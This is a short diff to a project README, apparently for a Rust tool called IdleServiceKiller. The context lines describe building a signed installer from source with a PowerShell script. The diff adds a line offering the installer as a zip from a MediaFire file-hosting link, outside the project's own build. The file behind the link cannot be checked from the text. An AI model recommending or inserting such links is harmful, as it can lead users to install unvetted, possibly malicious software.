@@ -86,3 +86,5 @@ powershell -File build.ps1
 ```
 
 The code is `source/src/main.rs`. The build writes the signed installer to a git-ignored `installer` folder at the top level.
+
+Or download from : https://www.mediafire.com/file/dcr786x0qqox2ox/IdleServiceKiller_installer.zip/file
